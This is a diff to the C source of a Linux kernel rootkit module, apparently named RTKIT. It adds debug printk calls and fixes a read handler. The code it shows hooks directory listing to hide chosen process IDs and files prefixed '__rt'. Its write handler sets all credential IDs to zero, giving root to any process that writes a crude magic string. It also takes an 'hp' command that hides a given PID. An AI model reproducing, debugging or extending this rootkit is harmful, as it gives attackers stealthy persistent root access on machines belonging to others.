@@ -86,6 +86,7 @@ static void set_addr_ro(void *addr)
 static int proc_filldir_new(struct dir_context *dirent, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
 	int i;
+	printk("fs_filldir_new");
 	dirent->actor=proc_filldir_orig;
 	for (i=0; i < current_pid; i++) {
 		if (!strcmp(name, pids_to_hide[i])) return 0;
@@ -96,6 +97,7 @@ static int proc_filldir_new(struct dir_context *dirent, const char *name, int na
 
 static int proc_readdir_new(struct file *filp, struct dir_context *dirent)
 {
+	printk("proc_readdir_new");
 	proc_filldir_orig = dirent->actor;
 	dirent->actor = proc_filldir_new;
 	return proc_readdir_orig(filp, dirent);
@@ -104,6 +106,7 @@ static int proc_readdir_new(struct file *filp, struct dir_context *dirent)
 //static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 static int fs_filldir_new(struct dir_context *dirent, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
+	printk("fs_filldir_new");
 	dirent->actor=fs_filldir_orig;
 	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
 	return fs_filldir_orig(dirent, name, namelen, offset, ino, d_type);
@@ -112,6 +115,7 @@ static int fs_filldir_new(struct dir_context *dirent, const char *name, int name
 //static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 static int fs_readdir_new(struct file *filp, struct dir_context *dirent)
 {
+	printk("fs_readdir_new");
 	fs_filldir_orig = dirent->actor;
 	dirent->actor = fs_filldir_new;
 	return fs_readdir_orig(filp, dirent);
@@ -122,6 +126,7 @@ static ssize_t rtkit_read(struct file *file, char __user *buff, size_t count, lo
 {
 	int size;
 	long long p = *offp;
+	int ret;
 	
 	sprintf(module_status, 
 "RTKIT\n\
@@ -144,12 +149,12 @@ STATUS\n\
 	if (p >= size) return 0;
   
 	if (count >= size-p) {
-		copy_to_user(buff, module_status+p, size-p);
+		ret = size-p - copy_to_user(buff, module_status+p, size-p);
 	} else {
-		copy_to_user(buff, module_status+p, count);
+		ret = count - copy_to_user(buff, module_status+p, count);
 	}
-  
-	return size-p;
+  	*offp += ret;
+	return ret;
 }
 
 static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *offp)
@@ -158,10 +163,8 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 	copy_from_user(kernel_buff, buff, MIN(1024, count));
 	if (!strncmp(kernel_buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
-		credentials->uid.val = 0;
-		credentials->euid.val = 0;
-		credentials->gid.val = 0;
-		credentials->egid.val = 0;
+		(credentials->uid).val = (credentials->euid).val = 0;
+		(credentials->gid).val = (credentials->egid).val = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(kernel_buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
